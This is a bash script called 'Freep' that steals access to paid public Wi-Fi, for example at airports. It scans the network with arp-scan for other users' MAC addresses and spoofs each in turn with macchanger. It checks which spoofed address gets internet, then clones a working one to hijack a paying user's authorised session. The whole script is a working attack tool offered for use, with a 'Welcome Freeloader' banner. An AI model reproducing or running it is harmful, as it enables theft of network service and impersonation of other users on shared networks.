#! /bin/bash
banner(){
echo "

───────────────────────────────────────────────────────────────────────────────────
─██████████████─████████████████───██████████████─██████████████────██████████████─
─██░░░░░░░░░░██─██░░░░░░░░░░░░██───██░░░░░░░░░░██─██░░░░░░░░░░██────██░░░░░░░░░░██─
─██░░██████████─██░░████████░░██───██░░██████████─██░░██████████────██░░██████░░██─
─██░░██████████─██░░████████░░██───██░░██████████─██░░██████████────██░░██████░░██─
─██░░░░░░░░░░██─██░░░░░░░░░░░░██───██░░░░░░░░░░██─██░░░░░░░░░░██────██░░░░░░░░░░██─
─██░░██████████─██░░██████░░████───██░░██████████─██░░██████████────██░░██████████─
─██░░██─────────██░░██──██░░██─────██░░██─────────██░░██────────────██░░██─────────
─██░░██─────────██░░██──██░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██────██░░██─────────
─██████─────────██████──██████████─██████████████─██████████████────██████─────────
───────────────────────────────────────────────────────────────────────────────────
								©Yada 2022 --Made with Love
"
sleep 1
clear
}

banner
echo "Welcome Freeloader To your Premium Lifestyle"
echo "
	[1] Scan users with internet [◉]
	[2] Get internet from previous scans [◉]
N.B
Increase sleep time, tries, timeout and spider for more accuracy
Rerun when in doubt of status
Include a ping to router (a call to home my wake the beast	
..............................................................................
"
#what you see below is what i call poor variable and functional declaration

Red='\033[1;31m'
Yellow='\033[1;33m'   
reset="\e[0m"
echo -e "Enter ${Red}selected number${reset} and hit enter:"
read action_1
#echo "Enter public pay wifi"
#read wifiname_1

frep="/tmp/freep"
#ofcourse i have to store all this somewhere
if [[ -d $frep ]];then
	#echo " previous configuration found ... "
	cd $frep
	if [[ -f online.txt && -f allusers.txt && -f users ]];then
		cat online.txt >> freepcollections/online.txt
		rm online.txt
		rm allusers.txt
		rm users
	else
		echo "previous configurations deleted/not found ...."
	fi
else
	mkdir $frep &>/dev/null
	mkdir $frep/freepcollections &>/dev/null
	echo "reconfigured configurations......."
fi

#Badly implimented code ahead

just_taking_interface(){
	sudo arp-scan -l | awk '/.*:.*:.*:.*:.*:.*/{print $2}' >> /tmp/freep/freepcollections/interface.txt
	#interface=$(head -1 /tmp/freep/allusers.txt | sed 's/,//')
}
select_point(){
	if [[ -f /tmp/freep/freepcollections/online.txt ]]; then
		output= $(cat /tmp/freep/freepcollections/online.txt | fzf)
		interface=$(head -1 /tmp/freep/allusers.txt | sed 's/,//')
		nmcli radio wifi off
		sudo macchanger --mac=${output} $interface &>/dev/null
		nmcli radio wifi on
		echo "Happy hacking"
		
	else
		if [[ -f $frep/freepcollections/online.txt ]]; then
			just_taking_interface
			output=$(cat $frep/freepcollections/online.txt)
			interface=$(head -1 /tmp/freep/freepcollections/interface.txt | sed 's/,//')
			nmcli radio wifi off
			sudo macchanger --mac=${output} $interface &>/dev/null
			nmcli radio wifi on
			echo "Happy hacking"
		else
			echo "No collections"
		fi
	fi
}
kill_wifi(){
	#debug_command echo "turning off"
	nmcli radio wifi off
	#sleep 10
}

wake_wifi(){
	#debug_command echo "turning on"
	nmcli radio wifi on
	sleep 3
}


if [[ "$action_1" -eq 1 ]]; then
	echo "Enter the public available but payed wifi network (airports.etc)"
	read wifiname_1
	sudo arp-scan -l | awk '/.*:.*:.*:.*:.*:.*/{print $2}' >> /tmp/freep/allusers.txt
	tail -n +4 /tmp/freep/allusers.txt >> /tmp/freep/users
	wc -l /tmp/freep/users
	input="/tmp/freep/users"
	interface=$(head -1 /tmp/freep/allusers.txt | sed 's/,//')
	while IFS= read -r user
	do
		kill_wifi
		sudo macchanger --mac=${user} $interface &>/dev/null
		#sudo macchanger --show $interface
		wake_wifi
		echo " Checking internet connectivity on $user"
		nmcli dev wifi connect "${wifiname_1}"  &>/dev/null
		sleep 11
		#ping -c3 google.com
		wget -q --tries=10 --timeout=10 --spider https://google.com
		if [[ "$?" -eq "0" ]]; then
			echo -e "[✔] ${Red}Internet available${reset}"
			echo "$user" >> /tmp/freep/online.txt
		else
			echo -e "[◉] ${Yellow}No internet connection${reset}"
		fi
	done < "$input"
	echo -e "${Red}Continue with part 2 of the script and select an online point [y/n]${reset} "
	read part2
	if [[ "$part2" -eq y || yes || Y || Y ]]; then
		select_point
	else
		break
	fi
else
	if [[ "$action_1" -eq 2 ]]; then
		select_point
	else
		echo "Nothing to do here"
	fi
fi

